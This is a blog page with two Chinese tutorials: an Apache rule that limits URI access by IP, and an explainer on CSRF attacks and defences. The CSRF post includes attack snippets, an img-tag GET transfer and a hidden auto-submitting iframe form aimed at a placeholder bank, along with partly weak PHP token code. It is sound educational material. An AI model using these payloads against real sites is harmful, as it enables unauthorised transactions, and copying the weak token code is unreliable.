<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>失落的乐章</title>

  <!-- keywords -->
  

  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="失落的乐章的Blog">
<meta property="og:type" content="website">
<meta property="og:title" content="失落的乐章">
<meta property="og:url" content="https://hcldirgit.github.io/page/30/index.html">
<meta property="og:site_name" content="失落的乐章">
<meta property="og:description" content="失落的乐章的Blog">
<meta property="og:locale" content="zh-Hans">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="失落的乐章">
<meta name="twitter:description" content="失落的乐章的Blog">
  
    <link rel="alternative" href="/atom.xml" title="失落的乐章" type="application/atom+xml">
  
  
    <link rel="icon" href="https://github.com/hcldirgit/image/blob/master/0.png?raw=true">
  
  <link rel="stylesheet" href="/css/style.css">
  
  
<!-- Google Analytics -->
<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-85415703-1', 'auto');
  ga('send', 'pageview');

</script>
<!-- End Google Analytics -->


  <script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>
  <script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>

  
</head>
<body>
  <div id="container">
    <div id="particles-js"></div>
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
	<header id="header" class="inner">
		<a href="/" class="profilepic">
			
			<img lazy-src="https://github.com/hcldirgit/image/blob/master/0.png?raw=true" class="js-avatar">
			
		</a>

		<hgroup>
		  <h1 class="header-author"><a href="/">失落的乐章</a></h1>
		</hgroup>

		
		<p class="header-subtitle">技术面前，永远都是学生。</p>
		

		
			<div class="switch-btn">
				<div class="icon">
					<div class="icon-ctn">
						<div class="icon-wrap icon-house" data-idx="0">
							<div class="birdhouse"></div>
							<div class="birdhouse_holes"></div>
						</div>
						<div class="icon-wrap icon-ribbon hide" data-idx="1">
							<div class="ribbon"></div>
						</div>
						
						
					</div>
					
				</div>
				<div class="tips-box hide">
					<div class="tips-arrow"></div>
					<ul class="tips-inner">
						<li>菜单</li>
						<li>标签</li>
						
						
					</ul>
				</div>
			</div>
		

		<div class="switch-area">
			<div class="switch-wrap">
				<section class="switch-part switch-part1">
					<nav class="header-menu">
						<ul>
						
							<li><a href="/">主页</a></li>
				        
							<li><a href="/archives">所有文章</a></li>
				        
						</ul>
					</nav>
					<nav class="header-nav">
						<div class="social">
							
						</div>
					</nav>
				</section>
				
				
				<section class="switch-part switch-part2">
					<div class="widget tagcloud" id="js-tagcloud">
						<a href="/tags/Ansible/" style="font-size: 10.42px;">Ansible</a> <a href="/tags/Apache/" style="font-size: 18.33px;">Apache</a> <a href="/tags/Cacti/" style="font-size: 11.67px;">Cacti</a> <a href="/tags/DNS/" style="font-size: 13.33px;">DNS</a> <a href="/tags/Docker/" style="font-size: 10px;">Docker</a> <a href="/tags/FTP/" style="font-size: 11.25px;">FTP</a> <a href="/tags/Git/" style="font-size: 10.83px;">Git</a> <a href="/tags/HA集群/" style="font-size: 11.67px;">HA集群</a> <a href="/tags/Hadoop/" style="font-size: 12.5px;">Hadoop</a> <a href="/tags/Jenkins/" style="font-size: 10.42px;">Jenkins</a> <a href="/tags/LAMP/" style="font-size: 19.58px;">LAMP</a> <a href="/tags/LNMP/" style="font-size: 17.08px;">LNMP</a> <a href="/tags/LVS/" style="font-size: 16.67px;">LVS</a> <a href="/tags/Linux/" style="font-size: 19.17px;">Linux</a> <a href="/tags/Linux命令/" style="font-size: 20px;">Linux命令</a> <a href="/tags/Linux安全/" style="font-size: 14.17px;">Linux安全</a> <a href="/tags/Memcached/" style="font-size: 11.25px;">Memcached</a> <a href="/tags/MongoDB/" style="font-size: 15.42px;">MongoDB</a> <a href="/tags/MySQL/" style="font-size: 17.5px;">MySQL</a> <a href="/tags/NFS/" style="font-size: 10px;">NFS</a> <a href="/tags/Nagios/" style="font-size: 11.67px;">Nagios</a> <a href="/tags/Nginx/" style="font-size: 17.92px;">Nginx</a> <a href="/tags/OpenStack/" style="font-size: 11.25px;">OpenStack</a> <a href="/tags/Php/" style="font-size: 14.58px;">Php</a> <a href="/tags/Puppet/" style="font-size: 11.25px;">Puppet</a> <a href="/tags/Python/" style="font-size: 14.58px;">Python</a> <a href="/tags/Redis/" style="font-size: 16.25px;">Redis</a> <a href="/tags/Resin/" style="font-size: 10px;">Resin</a> <a href="/tags/Saltstack/" style="font-size: 10px;">Saltstack</a> <a href="/tags/Samba/" style="font-size: 12.08px;">Samba</a> <a href="/tags/Squid/" style="font-size: 14.58px;">Squid</a> <a href="/tags/Tomcat/" style="font-size: 13.75px;">Tomcat</a> <a href="/tags/Zabbix/" style="font-size: 15.83px;">Zabbix</a> <a href="/tags/haproxy/" style="font-size: 12.5px;">haproxy</a> <a href="/tags/keepalived/" style="font-size: 12.92px;">keepalived</a> <a href="/tags/shell/" style="font-size: 15px;">shell</a> <a href="/tags/shell练习/" style="font-size: 18.75px;">shell练习</a> <a href="/tags/正则表达式/" style="font-size: 12.92px;">正则表达式</a>
					</div>
				</section>
				
				
				

				
			</div>
		</div>
	</header>				
</div>
    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
  	<div class="overlay">
  		<div class="slider-trigger"></div>
  		<h1 class="header-author js-mobile-header hide">失落的乐章</h1>
  	</div>
	<div class="intrude-less">
		<header id="header" class="inner">
			<div class="profilepic">
				<img lazy-src="https://github.com/hcldirgit/image/blob/master/0.png?raw=true" class="js-avatar">
			</div>
			<hgroup>
			  <h1 class="header-author">失落的乐章</h1>
			</hgroup>
			
			<p class="header-subtitle">技术面前，永远都是学生。</p>
			
			<nav class="header-menu">
				<ul>
				
					<li><a href="/">主页</a></li>
		        
					<li><a href="/archives">所有文章</a></li>
		        
		        <div class="clearfix"></div>
				</ul>
			</nav>
			<nav class="header-nav">
				<div class="social">
					
				</div>
			</nav>
		</header>				
	</div>
</nav>
      <div class="body-wrap">
  
    <article id="post-Linux安全/15. 针对访问 uri 限制 ip" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2017/09/03/Linux安全/15. 针对访问 uri 限制 ip/" class="article-date">
  	<time datetime="2017-09-02T18:04:46.019Z" itemprop="datePublished">2017-09-03</time>
</a>
    </div>
  
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/09/03/Linux安全/15. 针对访问 uri 限制 ip/">
        针对访问 uri 限制 ip
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在虚拟主机配置文件中加入如下字段：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Order deny,allow</div><div class="line">Deny from all</div><div class="line">Allow from 127.0.0.1</div><div class="line">Allow from 2.2.2.2</div></pre></td></tr></table></figure>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;假如该虚拟机的域名为 domain.com , 这样配置后，除了 127.0.0.1 和 2.2.2.2 外，其他ip访问以下类似的uri时都会直接禁止的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">http://domain.com/1212admin.txt </div><div class="line">http://domain.com/admin.php</div><div class="line">http://domain.com/1212/admin.html</div><div class="line">等</div></pre></td></tr></table></figure>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Linux安全/">Linux安全</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-Linux安全/13. 浅谈CSRF攻击方式" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2017/09/03/Linux安全/13. 浅谈CSRF攻击方式/" class="article-date">
  	<time datetime="2017-09-02T18:04:46.018Z" itemprop="datePublished">2017-09-03</time>
</a>
    </div>
  
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/09/03/Linux安全/13. 浅谈CSRF攻击方式/">
        浅谈CSRF攻击方式
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="一-CSRF是什么？"><a href="#一-CSRF是什么？" class="headerlink" title="一.CSRF是什么？"></a>一.CSRF是什么？</h2><p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;CSRF（Cross-site request forgery），中文名称：跨站请求伪造，也被称为：one click attack/session riding，缩写为：CSRF/XSRF。</p>
<h2 id="二-CSRF可以做什么？"><a href="#二-CSRF可以做什么？" class="headerlink" title="二.CSRF可以做什么？"></a>二.CSRF可以做什么？</h2><p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;你这可以这么理解CSRF攻击：<strong>攻击者盗用了你的身份，以你的名义发送恶意请求</strong>。CSRF能够做的事情包括：以你名义发送邮件，发消息，盗取你的账号，甚至于购买商品，虚拟货币转账……造成的问题包括：个人隐私泄露以及财产安全。</p>
<h2 id="三-CSRF漏洞现状"><a href="#三-CSRF漏洞现状" class="headerlink" title="三.CSRF漏洞现状"></a>三.CSRF漏洞现状</h2><p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;CSRF这种攻击方式在2000年已经被国外的安全人员提出，但在国内，直到06年才开始被关注，08年，国内外的多个大型社区和交互网站分别爆出CSRF漏洞，如：NYTimes.com（纽约时报）、Metafilter（一个大型的BLOG网站），YouTube和百度HI……而现在，互联网上的许多站点仍对此毫无防备，以至于安全业界称CSRF为“沉睡的巨人”。</p>
<h2 id="四-CSRF的原理"><a href="#四-CSRF的原理" class="headerlink" title="四.CSRF的原理"></a>四.CSRF的原理</h2><p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下图简单阐述了CSRF攻击的思想：</p>
<p><img src="https://github.com/hcldirgit/image/blob/master/%E6%B5%85%E8%B0%88CSRF%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/01.jpeg?raw=true" alt=""></p>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;从上图可以看出，要完成一次CSRF攻击，<strong>受害者必须依次完成两个步骤</strong>：</p>
<ol>
<li><p><strong>登录受信任网站A，并在本地生成Cookie。</strong></p>
</li>
<li><p><strong>在不登出A的情况下，访问危险网站B。</strong></p>
</li>
</ol>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;看到这里，你也许会说：“<strong>如果我不满足以上两个条件中的一个，我就不会受到CSRF的攻击</strong>”。是的，确实如此，但你不能保证以下情况不会发生：</p>
<ol>
<li><p>你不能保证你登录了一个网站后，不再打开一个tab页面并访问另外的网站。</p>
</li>
<li><p>你不能保证你关闭浏览器了后，你本地的Cookie立刻过期，你上次的会话已经结束。（事实上，关闭浏览器不能结束一个会话，但大多数人都会错误的认为关闭浏览器就等于退出登录/结束会话了……）</p>
</li>
<li><p>上图中所谓的攻击网站，可能是一个存在其他漏洞的可信任的经常被人访问的网站。</p>
</li>
</ol>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;上面大概地讲了一下CSRF攻击的思想，下面我将用几个例子详细说说具体的CSRF攻击，这里我以一个银行转账的操作作为例子（仅仅是例子，真实的银行网站没这么傻:&gt;）</p>
<h3 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h3><p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;银行网站A，它以GET请求来完成银行转账的操作，如：<a href="http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000" target="_blank" rel="external">http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000</a></p>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;危险网站B，它里面有一段HTML的代码如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;img src=http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000&gt;</div></pre></td></tr></table></figure>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;首先，你登录了银行网站A，然后访问危险网站B，噢，这时你会发现你的银行账户少了1000块……</p>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;为什么会这样呢？原因是银行网站A违反了HTTP规范，使用GET请求更新资源。在访问危险网站B的之前，你已经登录了银行网站A，而B中的<img>以GET的方式请求第三方资源（这里的第三方就是指银行网站了，原本这是一个合法的请求，但这里被不法分子利用了），所以你的浏览器会带上你的银行网站A的Cookie发出Get请求，去获取资源“<a href="http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000”，结果银行网站服务器收到请求后，认为这是一个更新资源操作（转账操作），所以就立刻进行转账操作" target="_blank" rel="external">http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000”，结果银行网站服务器收到请求后，认为这是一个更新资源操作（转账操作），所以就立刻进行转账操作</a>……</p>
<h3 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h3><p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;为了杜绝上面的问题，银行决定改用POST请求完成转账操作。</p>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;银行网站A的WEB表单如下：　　</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;form action=<span class="string">"Transfer.php"</span> method=<span class="string">"POST"</span>&gt;</div><div class="line">　　&lt;p&gt;ToBankId: &lt;input <span class="built_in">type</span>=<span class="string">"text"</span> name=<span class="string">"toBankId"</span> /&gt;&lt;/p&gt;</div><div class="line">　　&lt;p&gt;Money: &lt;input <span class="built_in">type</span>=<span class="string">"text"</span> name=<span class="string">"money"</span> /&gt;&lt;/p&gt;</div><div class="line">　　&lt;p&gt;&lt;input <span class="built_in">type</span>=<span class="string">"submit"</span> value=<span class="string">"Transfer"</span> /&gt;&lt;/p&gt;</div><div class="line">&lt;/form&gt;</div></pre></td></tr></table></figure>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;后台处理页面Transfer.php如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">　　session_start();</div><div class="line">　　<span class="keyword">if</span> (isset(<span class="variable">$_REQUEST</span>[<span class="string">'toBankId'</span>] &amp;&amp;　isset(<span class="variable">$_REQUEST</span>[<span class="string">'money'</span>]))</div><div class="line">　　&#123;</div><div class="line">　　    buy_stocks(<span class="variable">$_REQUEST</span>[<span class="string">'toBankId'</span>],　<span class="variable">$_REQUEST</span>[<span class="string">'money'</span>]);</div><div class="line">　　&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;危险网站B，仍然只是包含那句HTML代码：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;img src=http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000&gt;</div></pre></td></tr></table></figure>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;和示例1中的操作一样，你首先登录了银行网站A，然后访问危险网站B，结果…..和示例1一样，你再次没了1000块～T_T，这次事故的原因是：银行后台使用了$_REQUEST去获取请求的数据，而$_REQUEST既可以获取GET请求的数据，也可以获取POST请求的数据，这就造成了在后台处理程序无法区分这到底是GET请求的数据还是POST请求的数据。在PHP中，可以使用$_GET和$_POST分别获取GET请求和POST请求的数据。在JAVA中，用于获取请求数据request一样存在不能区分GET请求数据和POST数据的问题。</p>
<h3 id="示例3："><a href="#示例3：" class="headerlink" title="示例3："></a>示例3：</h3><p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;经过前面2个惨痛的教训，银行决定把获取请求数据的方法也改了，改用$_POST，只获取POST请求的数据，后台处理页面Transfer.php代码如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">　　session_start();</div><div class="line">　　<span class="keyword">if</span> (isset(<span class="variable">$_POST</span>[<span class="string">'toBankId'</span>] &amp;&amp;　isset(<span class="variable">$_POST</span>[<span class="string">'money'</span>]))</div><div class="line">　　&#123;</div><div class="line">　　    buy_stocks(<span class="variable">$_POST</span>[<span class="string">'toBankId'</span>],　<span class="variable">$_POST</span>[<span class="string">'money'</span>]);</div><div class="line">　　&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然而，危险网站B与时俱进，它改了一下代码：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">&lt;html&gt;</div><div class="line">　　&lt;head&gt;</div><div class="line">　　　　&lt;script <span class="built_in">type</span>=<span class="string">"text/javascript"</span>&gt;</div><div class="line">　　　　　　<span class="keyword">function</span> steal()</div><div class="line">　　　　　　&#123;</div><div class="line">          　　　　 iframe = document.frames[<span class="string">"steal"</span>];</div><div class="line">　　     　　      iframe.document.Submit(<span class="string">"transfer"</span>);</div><div class="line">　　　　　　&#125;</div><div class="line">　　　　&lt;/script&gt;</div><div class="line">　　&lt;/head&gt;</div><div class="line"></div><div class="line">　　&lt;body onload=<span class="string">"steal()"</span>&gt;</div><div class="line">　　　　&lt;iframe name=<span class="string">"steal"</span> display=<span class="string">"none"</span>&gt;</div><div class="line">　　　　　　&lt;form method=<span class="string">"POST"</span> name=<span class="string">"transfer"</span>　action=<span class="string">"http://www.myBank.com/Transfer.php"</span>&gt;</div><div class="line">　　　　　　　　&lt;input <span class="built_in">type</span>=<span class="string">"hidden"</span> name=<span class="string">"toBankId"</span> value=<span class="string">"11"</span>&gt;</div><div class="line">　　　　　　　　&lt;input <span class="built_in">type</span>=<span class="string">"hidden"</span> name=<span class="string">"money"</span> value=<span class="string">"1000"</span>&gt;</div><div class="line">　　　　　　&lt;/form&gt;</div><div class="line">　　　　&lt;/iframe&gt;</div><div class="line">　　&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果用户仍是继续上面的操作，很不幸，结果将会是再次不见1000块……因为这里危险网站B暗地里发送了POST请求到银行!</p>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;总结一下上面3个例子，CSRF主要的攻击模式基本上是以上的3种，其中以第1,2种最为严重，因为触发条件很简单，一个<img>就可以了，而第3种比较麻烦，需要使用JavaScript，所以使用的机会会比前面的少很多，但无论是哪种情况，只要触发了CSRF攻击，后果都有可能很严重。</p>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;理解上面的3种攻击模式，其实可以看出，<strong>CSRF攻击是源于WEB的隐式身份验证机制！WEB的身份验证机制虽然可以保证一个请求是来自于某个用户的浏览器，但却无法保证该请求是用户批准发送的</strong>！</p>
<h2 id="五-CSRF的防御"><a href="#五-CSRF的防御" class="headerlink" title="五.CSRF的防御"></a>五.CSRF的防御</h2><p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;总结了一下看到的资料，CSRF的防御可以从服务端和客户端两方面着手，防御效果是从服务端着手效果比较好，现在一般的CSRF防御也都在服务端进行。</p>
<h3 id="1-服务端进行CSRF防御"><a href="#1-服务端进行CSRF防御" class="headerlink" title="1.服务端进行CSRF防御"></a>1.服务端进行CSRF防御</h3><p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;服务端的CSRF方式方法很多样，但总的思想都是一致的，就是在客户端页面增加伪随机数。</p>
<h4 id="Cookie-Hashing-所有表单都包含同一个伪随机值-："><a href="#Cookie-Hashing-所有表单都包含同一个伪随机值-：" class="headerlink" title="Cookie Hashing(所有表单都包含同一个伪随机值)："></a>Cookie Hashing(所有表单都包含同一个伪随机值)：</h4><p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这可能是最简单的解决方案了，因为攻击者不能获得第三方的Cookie(理论上)，所以表单中的数据也就构造失败了:&gt;</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">　　//构造加密的Cookie信息</div><div class="line">　　<span class="variable">$value</span> = “DefenseSCRF”;</div><div class="line">　　setcookie(”cookie”, <span class="variable">$value</span>, time()+3600);</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在表单里增加Hash值，以认证这确实是用户发送的请求。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">　　<span class="variable">$hash</span> = md5(<span class="variable">$_COOKIE</span>[<span class="string">'cookie'</span>]);</div><div class="line">?&gt;</div><div class="line">&lt;form method=”POST” action=”transfer.php”&gt;</div><div class="line">　　&lt;input <span class="built_in">type</span>=”text” name=”toBankId”&gt;</div><div class="line">　　&lt;input <span class="built_in">type</span>=”text” name=”money”&gt;</div><div class="line">　　&lt;input <span class="built_in">type</span>=”hidden” name=”<span class="built_in">hash</span>” value=”&lt;?=<span class="variable">$hash</span>;?&gt;”&gt;</div><div class="line">　　&lt;input <span class="built_in">type</span>=”submit” name=”submit” value=”Submit”&gt;</div><div class="line">&lt;/form&gt;</div></pre></td></tr></table></figure>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后在服务器端进行Hash值验证</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">    <span class="keyword">if</span>(isset(<span class="variable">$_POST</span>[<span class="string">'check'</span>])) &#123;</div><div class="line">        <span class="variable">$hash</span> = md5(<span class="variable">$_COOKIE</span>[<span class="string">'cookie'</span>]);</div><div class="line">        <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">'check'</span>] == <span class="variable">$hash</span>) &#123;</div><div class="line">            doJob();</div><div class="line">        &#125; <span class="keyword">else</span> &#123;</div><div class="line">        //...</div><div class="line">        &#125;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">    //...</div><div class="line">    &#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这个方法个人觉得已经可以杜绝99%的CSRF攻击了，那还有1%呢….由于用户的Cookie很容易由于网站的XSS漏洞而被盗取，这就另外的1%。一般的攻击者看到有需要算Hash值，基本都会放弃了，某些除外，所以如果需要100%的杜绝，这个不是最好的方法。</p>
<h4 id="验证码"><a href="#验证码" class="headerlink" title="验证码"></a>验证码</h4><p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这个方案的思路是：每次的用户提交都需要用户在表单中填写一个图片上的随机字符串，厄….这个方案可以完全解决CSRF，但个人觉得在易用性方面似乎不是太好，还有听闻是验证码图片的使用涉及了一个被称为MHTML的Bug，可能在某些版本的微软IE中受影响。</p>
<h4 id="One-Time-Tokens-不同的表单包含一个不同的伪随机值"><a href="#One-Time-Tokens-不同的表单包含一个不同的伪随机值" class="headerlink" title="One-Time Tokens(不同的表单包含一个不同的伪随机值)"></a>One-Time Tokens(不同的表单包含一个不同的伪随机值)</h4><p>&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在实现One-Time Tokens时，需要注意一点：就是“并行会话的兼容”。如果用户在一个站点上同时打开了两个不同的表单，CSRF保护措施不应该影响到他对任何表单的提交。考虑一下如果每次表单被装入时站点生成一个伪随机值来覆盖以前的伪随机值将会发生什么情况：用户只能成功地提交他最后打开的表单，因为所有其他的表单都含有非法的伪随机值。必须小心操作以确保CSRF保护措施不会影响选项卡式的浏览或者利用多个浏览器窗口浏览一个站点。</p>
<h2 id="以下我的实现"><a href="#以下我的实现" class="headerlink" title="以下我的实现:"></a>以下我的实现:</h2><h3 id="1-先是令牌生成函数-gen-token-："><a href="#1-先是令牌生成函数-gen-token-：" class="headerlink" title="1.先是令牌生成函数(gen_token())："></a>1.先是令牌生成函数(gen_token())：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">    <span class="keyword">function</span> <span class="function"><span class="title">gen_token</span></span>() &#123;</div><div class="line">    //这里我是贪方便，实际上单使用Rand()得出的随机数作为令牌，也是不安全的。</div><div class="line">    //这个可以参考我写的Findbugs笔记中的《Random object created and used only once》</div><div class="line">    <span class="variable">$token</span> = md5(uniqid(rand(), <span class="literal">true</span>));</div><div class="line">    <span class="built_in">return</span> <span class="variable">$token</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="2-然后是Session令牌生成函数-gen-stoken-："><a href="#2-然后是Session令牌生成函数-gen-stoken-：" class="headerlink" title="2.然后是Session令牌生成函数(gen_stoken())："></a>2.然后是Session令牌生成函数(gen_stoken())：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">    <span class="keyword">function</span> <span class="function"><span class="title">gen_stoken</span></span>() &#123;</div><div class="line">        <span class="variable">$pToken</span> = <span class="string">""</span>;</div><div class="line">        <span class="keyword">if</span>(<span class="variable">$_SESSION</span>[STOKEN_NAME]  == <span class="variable">$pToken</span>)&#123;</div><div class="line">            //没有值，赋新值</div><div class="line">            <span class="variable">$_SESSION</span>[STOKEN_NAME] = gen_token();</div><div class="line">        &#125;    </div><div class="line">        <span class="keyword">else</span>&#123;</div><div class="line">            //继续使用旧的值</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<h3 id="3-WEB表单生成隐藏输入域的函数："><a href="#3-WEB表单生成隐藏输入域的函数：" class="headerlink" title="3.WEB表单生成隐藏输入域的函数：　　"></a>3.WEB表单生成隐藏输入域的函数：　　</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">     <span class="keyword">function</span> <span class="function"><span class="title">gen_input</span></span>() &#123;</div><div class="line">　　     gen_stoken();</div><div class="line">         <span class="built_in">echo</span> “&lt;input <span class="built_in">type</span>=\”hidden\” name=\”<span class="string">" . FTOKEN_NAME . “\”</span></div><div class="line"><span class="string">  　　     value=\”"</span> . <span class="variable">$_SESSION</span>[STOKEN_NAME] . “\”&gt; “;</div><div class="line">　　&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<h3 id="4-WEB表单结构："><a href="#4-WEB表单结构：" class="headerlink" title="4.WEB表单结构："></a>4.WEB表单结构：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">  session_start();</div><div class="line">  include(”functions.php”);</div><div class="line">?&gt;</div><div class="line">&lt;form method=”POST” action=”transfer.php”&gt;</div><div class="line">  &lt;input <span class="built_in">type</span>=”text” name=”toBankId”&gt;</div><div class="line">  &lt;input <span class="built_in">type</span>=”text” name=”money”&gt;</div><div class="line">  &lt;? gen_input(); ?&gt;</div><div class="line">  &lt;input <span class="built_in">type</span>=”submit” name=”submit” value=”Submit”&gt;</div><div class="line">&lt;/FORM&gt;</div></pre></td></tr></table></figure>
